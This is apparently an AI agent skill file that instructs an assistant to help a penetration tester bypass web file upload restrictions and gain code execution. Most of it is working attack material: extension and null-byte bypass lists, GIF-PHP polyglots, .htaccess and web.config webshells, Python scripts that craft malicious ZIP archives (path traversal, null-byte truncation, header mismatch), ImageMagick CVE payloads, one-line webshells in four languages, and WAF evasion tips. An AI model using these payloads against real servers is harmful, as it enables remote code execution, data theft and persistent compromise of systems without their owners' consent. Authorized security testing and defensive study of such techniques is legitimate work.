---
name: file-upload-bypass
description: >
  Guide file upload restriction bypass during authorized penetration testing.
keywords:
  - file upload bypass
  - upload shell
  - webshell upload
  - extension bypass
  - upload filter bypass
  - magic byte bypass
  - content-type bypass
  - upload RCE
  - unrestricted file upload
  - image upload exploit
  - upload polyglot
  - .htaccess upload
  - web.config upload
  - double extension
  - zip null byte
  - zip filename truncation
  - zip header mismatch
tools:
  - burpsuite
  - exiftool
  - ffuf
opsec: medium
---

# File Upload Bypass

You are helping a penetration tester bypass file upload restrictions to achieve
code execution or other impact on the target server. The application has a file
upload feature with some form of validation that needs to be circumvented. All
testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[file-upload-bypass] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- A file upload endpoint (form, API, drag-and-drop)
- Ability to intercept and modify requests (Burp Suite or similar proxy)
- Know or can discover: server technology (PHP/ASP/JSP/Node), web server
  (Apache/IIS/Nginx), where uploaded files land, whether they're directly
  accessible via URL

## Step 1: Assess

If not already provided, determine:
1. **Server stack** — PHP/ASP.NET/JSP/Node/Python (check headers, error pages,
   default files)
2. **Web server** — Apache/IIS/Nginx (response headers, default error pages)
3. **Validation type** — what gets rejected? Try uploading:
   - `test.php` (extension check)
   - `test.txt` with `Content-Type: application/x-php` (content-type check)
   - `test.txt` containing `<?php` (content inspection)
   - Binary file with wrong extension (magic byte check)
4. **Upload location** — where do files land? Can you access them directly via URL?
5. **Processing** — does the server resize images, rename files, strip metadata?

Understanding which validations are in place determines which bypass to use.
Skip if context was already provided.

## Step 2: Extension Bypass

The most common restriction. Try these in order of reliability.

### Alternative Extensions

Upload the same payload with different extensions for the target language:

```
# PHP (try each — server config determines which execute)
.php .php5 .php7 .phtml .pht .phar .phps .pgif .inc .hphp .module .shtml

# ASP/ASPX
.asp .aspx .ashx .asmx .config .cer .asa .cshtml .vbhtml

# JSP
.jsp .jspx .jsw .jsv .jspf .do .action

# Coldfusion
.cfm .cfml .cfc .dbm

# Perl
.pl .pm .cgi
```

### Double Extensions

Exploit misconfigured servers that check only the last extension but execute
based on the first recognized one:

```
shell.php.jpg          # Apache may execute as PHP if AddHandler is set
shell.php.png          # Same principle
shell.asp;.jpg         # IIS < 7.0 path parameter confusion
shell.aspx;1.jpg       # IIS semicolon truncation
shell.php.xxxxx        # Apache — unrecognized final ext, falls back to .php
```

**Reverse double extension** (Apache with misconfigured `AddHandler`):
```
shell.jpg.php          # Executes as PHP when AddHandler matches .php anywhere
```

### Null Byte Injection

Works on older systems (PHP < 5.3.4, some Java implementations) for direct
uploads:

```
shell.php%00.jpg       # URL-encoded null byte
shell.php\x00.jpg      # Literal null byte in multipart data
shell.php%00.png%00.jpg
```

**Important**: Null bytes in direct upload filenames require old PHP, but null
bytes inside **ZIP entry filenames** work against modern PHP because truncation
happens at the filesystem/extraction level, not PHP string handling. See
Step 6 → ZIP Null Byte Filename Truncation.

### Case Variation

Bypass case-sensitive blacklists:

```
shell.pHp    shell.Php    shell.pHP5    shell.PhAr
shell.aSp    shell.aSpX   shell.AsHx
shell.jSp    shell.jSpX
```

### Special Characters

Bypass string-matching filters:

```
shell.php%20           # Trailing space (Windows strips it)
shell.php%0a           # Trailing newline
shell.php%0d%0a        # CRLF
shell.php.            # Trailing dot (Windows normalizes)
shell.php......        # Multiple dots
shell.php/            # Trailing slash
shell.php.\           # Trailing backslash (Windows)
```

### NTFS Alternate Data Streams (Windows/IIS)

```
shell.asp::$data       # Bypasses extension check, IIS serves as ASP
shell.aspx::$data
shell.php::$data
```

### Filename Length Overflow

Linux max filename: 255 bytes. Windows: 236 bytes. Craft a name where
truncation removes the safe extension:

```
# 232 A's + .php + .gif — truncation drops .gif on Windows
AAAA[x232].php.gif
```

### Right-to-Left Override (RTLO)

Unicode character `U+202E` reverses display order:

```
shell.%E2%80%AEphp.jpg    # Displays as shell.gpj.php in some contexts
```

## Step 3: Content-Type & Magic Byte Bypass

### Content-Type Manipulation

Change the `Content-Type` header in the upload request to an allowed MIME type:

```http
Content-Type: image/png
Content-Type: image/jpeg
Content-Type: image/gif
```

Keep the actual file content as your payload. Many applications check only
the Content-Type header, not the file contents.

### Magic Byte Prepending

Prepend valid file signatures before your payload to bypass file-type detection:

| Format | Magic Bytes | Notes |
|--------|-------------|-------|
| GIF | `GIF89a` | Plain ASCII — easiest to use |
| JPEG | `\xff\xd8\xff\xe0` | Binary header |
| PNG | `\x89PNG\r\n\x1a\n` | Binary header |
| PDF | `%PDF-1.5` | Plain ASCII |

```bash
# Create a GIF-PHP polyglot (GIF is easiest — plain text header)
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
```

### Combined Bypass

When both Content-Type and magic bytes are checked, set `Content-Type: image/gif`,
start content with `GIF89a`, append PHP payload, and use an extension bypass from
Step 2 for the filename.

## Step 4: Server Configuration Exploitation

Upload configuration files that change how the server handles other files.

### Apache .htaccess

Upload a `.htaccess` file that makes a custom extension executable:

```apache
AddType application/x-httpd-php .rce
```

Then upload `shell.rce` — Apache executes it as PHP.

**Self-contained .htaccess webshell** (the .htaccess itself runs as PHP):

```apache
<Files ~ "^\.ht">
  Order allow,deny
  Allow from all
</Files>
AddType application/x-httpd-php .htaccess
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

### IIS web.config

Upload a `web.config` that registers a handler for `.config` files:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
  </system.webServer>
</configuration>
<!-- <% Response.write("-"&"->") %>
<% Set c=CreateObject("WScript.Shell").Exec("cmd /c "&Request("cmd"))
Response.Write(c.StdOut.ReadAll):Response.write("<!-"&"-") %> -->
```

Add `<security><requestFiltering>` to remove `.config` from hidden segments
if direct access is blocked.

### uWSGI .ini

If the server uses uWSGI and processes uploaded `.ini` files:

```ini
[uwsgi]
; RCE via exec magic operator
body = @(exec://whoami)
; SSRF via http magic operator
test = @(http://169.254.169.254/latest/meta-data/)
```

Executes when uWSGI parses the config (restart, crash, autoreload).

## Step 5: Image Polyglots & Metadata Injection

For applications that validate image dimensions, run `getimagesize()`, or
reprocess images.

### EXIF Metadata Injection

Embed PHP in image metadata — survives basic validation but not reprocessing:

```bash
# Embed payload in EXIF Comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg
mv legit.jpg shell.php.jpg

# Embed in multiple EXIF fields for redundancy
exiftool -Artist='<?php system($_GET["cmd"]); __halt_compiler(); ?>' \
         -Copyright='<?php eval($_POST["x"]); ?>' legit.jpg
```

Exploit via LFI: `include('/uploads/shell.php.jpg')` executes the PHP in
metadata.

### Simple Append

Append PHP to a valid image — survives `getimagesize()` but not reprocessing:

```bash
cp legit.png shell.png
echo '<?php system($_GET["cmd"]); ?>' >> shell.png
```

### Polyglot Images (Survive Reprocessing)

For apps that run `imagecreatefromjpeg()` / `imagepng()` / GD library, encode
the payload into pixel data so it survives image reprocessing:

- **PNG via PLTE chunk**: Encode payload bytes as RGB color values in the palette.
  Use `imagecreate()` + `imagecolorallocate()` + `imagepng()`. Payload length
  must be divisible by 3.
- **GIF via global color table**: Same approach with `imagegif()`.

These produce valid images with PHP in pixel data — require LFI or a
misconfiguration to trigger execution.

## Step 6: Archive & Indirect Exploitation

### ZIP Path Traversal

If the application extracts uploaded archives, inject path traversal in
filenames to write outside the upload directory:

```python
import zipfile
from io import BytesIO

f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../var/www/html/shell.php',
           '<?php system($_GET["cmd"]); ?>')
z.writestr('readme.txt', 'Legit content')
z.close()
with open('payload.zip', 'wb') as out:
    out.write(f.getvalue())
```

**Symlink technique** — read arbitrary files:

```bash
ln -s /etc/passwd symlink.txt
zip --symlinks payload.zip symlink.txt
```

### ZIP Null Byte Filename Truncation

When a server extracts uploaded ZIP archives and checks entry names for
blocked extensions, inject a null byte into the ZIP entry filename so the
filter sees an allowed extension (`.pdf`) but the filesystem truncates at
the null byte and writes a dangerous extension (`.php`).

**Why this works on modern PHP**: The extension filter checks the filename as
a PHP string (null byte is a valid character, name ends in `.pdf`). But when
`ZipArchive::extractTo()` calls the underlying C library to write the file,
the C string is truncated at the null byte — the file lands as `shell.php`.
This is NOT the same as null bytes in direct upload filenames (patched in
PHP 5.3.4) — this exploits the PHP/C boundary during ZIP extraction.

**Step 1** — Create a ZIP with a double-dot placeholder in the filename:

```python
import zipfile

with zipfile.ZipFile("payload.zip", "w") as zf:
    # arcname has double dot: file.php..pdf
    # The second dot will be replaced with \x00 via hex edit
    zf.write("shell.php", arcname="file.php..pdf")
```

Where `shell.php` contains a standard webshell (`<?php system($_GET['cmd']); ?>`).
The content filter typically does not scan for PHP tags when the entry name
ends in `.pdf`.

**Step 2** — Hex-edit the ZIP to replace the second `.` with a null byte
(`\x00`). The filename `file.php..pdf` appears twice in the ZIP: once in the
**local file header** and once in the **central directory entry**. Replace the
`.` before `pdf` with `\x00` in **both** locations:

```
Before: 66 69 6C 65 2E 70 68 70 2E 2E 70 64 66   file.php..pdf
After:  66 69 6C 65 2E 70 68 70 2E 00 70 64 66   file.php.\x00pdf
```

Use any hex editor (`hexeditor`, `xxd`, `printf` with `dd`). Automated:

```python
# Read the ZIP, replace the second dot with null byte
with open("payload.zip", "rb") as f:
    data = f.read()

# Replace both occurrences (local header + central directory)
data = data.replace(b"file.php..pdf", b"file.php.\x00pdf")

with open("payload.zip", "wb") as f:
    f.write(data)
```

**Step 3** — Verify the archive entry name is truncated:

```bash
unzip -l payload.zip
# Should show: file.php   (truncated at null byte)
```

**Step 4** — Upload. The server's extension filter reads the full bytes
including the null, sees `.pdf` at the end, and allows it. Extraction
truncates at the null byte and writes `file.php` to disk. The URL may
include `%20` or other artifacts from null byte handling — try both the
clean name and the URL-encoded variant:

```
http://target.com/uploads/file.php
http://target.com/uploads/file.php%20
```

**When to use**: Server extracts ZIP uploads, checks entry names for blocked
extensions, and extracted files are web-accessible. The extension filter is
the primary defense (content inspection may or may not be present). This
bypasses both extension whitelists and blacklists because the filter never
sees `.php` — it sees `.pdf`.

### ZIP Local/Central Header Mismatch

ZIP files store each filename in two places: the **local file header** (at the
file data) and the **central directory entry** (at the end of the archive).
Most PHP/Java ZIP libraries read filenames from the central directory, but some
extraction implementations write files using local header names. If the
server's filter checks central directory names but extracts using local header
names, use different filenames in each location.

```python
import struct

def local_header(filename, data):
    """Build a local file header with the REAL filename."""
    return struct.pack('<4sHHHHHIIIHH',
        b'PK\x03\x04', 20, 0, 0, 0, 0, 0,
        len(data), len(data), len(filename), 0) + filename + data

def central_entry(filename, offset, data):
    """Build a central directory entry with the FAKE filename."""
    return struct.pack('<4sHHHHHHIIIHHHHHII',
        b'PK\x01\x02', 20, 20, 0, 0, 0, 0, 0,
        len(data), len(data), len(filename), 0, 0, 0, 0, 0, offset) + filename

# Local header: real filename (.php or .htaccess)
# Central dir: innocuous filename (.pdf)
payload = b'<?php system($_GET["cmd"]); ?>'
local = local_header(b'shell.php', payload)
central = central_entry(b'report.pdf', 0, payload)

eocd = struct.pack('<4sHHHHIIH',
    b'PK\x05\x06', 0, 0, 1, 1,
    len(central), len(local), 0)

with open('mismatch.zip', 'wb') as f:
    f.write(local + central + eocd)
```

The filter reads the central directory, sees `report.pdf`, and allows the
upload. Extraction uses the local header and writes `shell.php` to disk.

**Variant — plant .htaccess**: Use local=`.htaccess` with
`AddType application/x-httpd-php .pdf`, central=`styles.css`. If
`AllowOverride` is enabled, subsequent `.pdf` uploads execute as PHP.

**When to use**: Server extracts ZIPs and the filter checks central directory
names. Test with `.htaccess` first (low risk, confirms the mismatch works)
before trying `.php` (higher value, confirms execution).

**Limitation**: Only works when the extraction implementation reads local
headers. PHP's `ZipArchive` typically uses central directory names. Some
custom extraction code, Java's `ZipInputStream`, or C-level libraries may
use local headers. Test empirically.

### Filename Injection

If uploaded filenames are used in server-side operations without sanitization:

```
# SQL injection via filename
shell.jpg' OR 1=1--.php

# Command injection via filename
shell.jpg;sleep 10;.php

# XSS via filename (stored in admin panel)
"><img src=x onerror=alert(1)>.jpg

# Path traversal via filename
../../../etc/passwd.jpg
```

### Race Conditions

If the server uploads to a temporary location then validates/deletes, race it:
upload a webshell in a rapid loop while simultaneously requesting the temporary
path. Use two threads — one POSTing the upload, one GETting the expected URL.
If you hit the window between upload and deletion, the shell executes. Burp
Intruder or `turbo-intruder` are effective for tight race windows.

### ImageMagick Exploits

If the server processes images with ImageMagick:

**CVE-2022-44268 (arbitrary file read):**

```bash
pngcrush -text a "profile" "/etc/passwd" exploit.png
# Upload exploit.png → server processes with convert → download result
identify -verbose converted.png  # hex-encoded file contents in metadata
```

**CVE-2016-3714 (ImageTragick RCE):**

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.jpg"|id > /tmp/proof")'
pop graphic-context
```

Save as `.mvg`, `.svg`, or any image extension that ImageMagick processes.

## Step 7: Webshell Payloads

Minimal payloads for each language — use after achieving a bypass.

```php
# PHP — standard
<?php system($_GET['cmd']); ?>
# PHP — minimal (17 bytes)
<?=`$_GET[0]`?>
# PHP — if <?php blocked (PHP < 7.0 ONLY — removed in 7.0)
<script language="php">system($_GET['cmd']);</script>
# PHP — if system() blocked: shell_exec(), passthru(), backticks

# ASP
<% Set c=CreateObject("WScript.Shell").Exec("cmd /c "&Request("cmd")):Response.Write(c.StdOut.ReadAll) %>

# JSP
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

# ASPX (C#)
<%@ Page Language="C#" %><%new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start()%>
```

## Step 8: Escalate or Pivot

## OPSEC Notes

- Uploaded files persist on disk — **always clean up** webshells after testing
- Upload activity logged in web server access logs and potentially WAF logs
- `.htaccess` / `web.config` changes affect all users — restore originals
- Polyglot images are stealthier than raw PHP files
- Use innocuous filenames for initial testing (`test.jpg`, not `shell.php`)
- Race condition exploits generate high request volume — may trigger rate limiting

## Troubleshooting

### All Extensions Rejected

- Check if the server uses a whitelist (only allows `.jpg`, `.png`, etc.)
  vs a blacklist (blocks `.php`, `.asp`, etc.)
- Whitelist: focus on polyglot techniques + LFI chain, or config file upload
  (.htaccess / web.config)
- Blacklist: try every alternative extension from Step 2 systematically
- Use Burp Intruder with extension wordlist for automated testing

### File Uploads but Doesn't Execute

- Check if the file is renamed (hash-based names prevent direct execution)
- Check if files are served from a different domain/CDN (no server-side execution)
- Check if the upload directory has execution disabled (try path traversal in
  the filename to write elsewhere: `../shell.php`)
- Try config file upload to re-enable execution in the upload directory
- If the server extracts ZIPs: try ZIP null byte filename truncation (Step 6)
  to land a `.php` file despite extension filtering — the extension filter sees
  `.pdf` but extraction writes `.php`, which Apache processes natively without
  needing `.htaccess` overrides

### Image Validation Passes but PHP Stripped

- Server may be reprocessing images (GD library, ImageMagick)
- Try polyglot techniques from Step 5 that survive reprocessing
- Try EXIF injection — some reprocessors preserve metadata
- Fall back to ImageMagick CVEs if the server uses it

### Can't Find Upload Location

- Check response headers/body after upload for the file URL
- Try common paths: `/uploads/`, `/images/`, `/media/`, `/files/`, `/tmp/`
- Check HTML source for upload form action and any path hints
- Fuzz with ffuf: `ffuf -u http://TARGET/FUZZ/filename.ext -w common.txt`

### WAF Blocking Upload Requests

- Try chunked transfer encoding
- Modify multipart boundary to unusual values
- Add extra Content-Disposition parameters
- Split payload across multiple form fields
- URL-encode parts of the filename in the multipart header
